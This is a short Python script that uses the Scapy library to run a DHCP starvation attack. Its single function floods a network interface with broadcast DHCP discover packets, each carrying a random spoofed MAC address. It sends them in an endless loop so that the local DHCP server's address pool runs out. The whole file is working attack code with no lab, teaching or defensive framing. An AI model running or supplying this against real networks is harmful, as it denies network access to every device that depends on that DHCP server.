from scapy.all import *
from scapy.layers.inet import *
from scapy.layers.dhcp import *

def dhcp_starvation(ifaceName):
    conf.checkIPaddr = False # disable IP address check
    dhcp_discover = Ether(dst='ff:ff:ff:ff:ff:ff',src=RandMAC())  \
                        /IP(src='0.0.0.0',dst='255.255.255.255') \
                        /UDP(sport=68,dport=67) \
                        /BOOTP(op=1,chaddr = RandMAC()) \
                        /DHCP(options=[('message-type','discover'),('end')]) #create DHCP discover packet

    sendp(dhcp_discover, iface=ifaceName ,loop=1,verbose=1)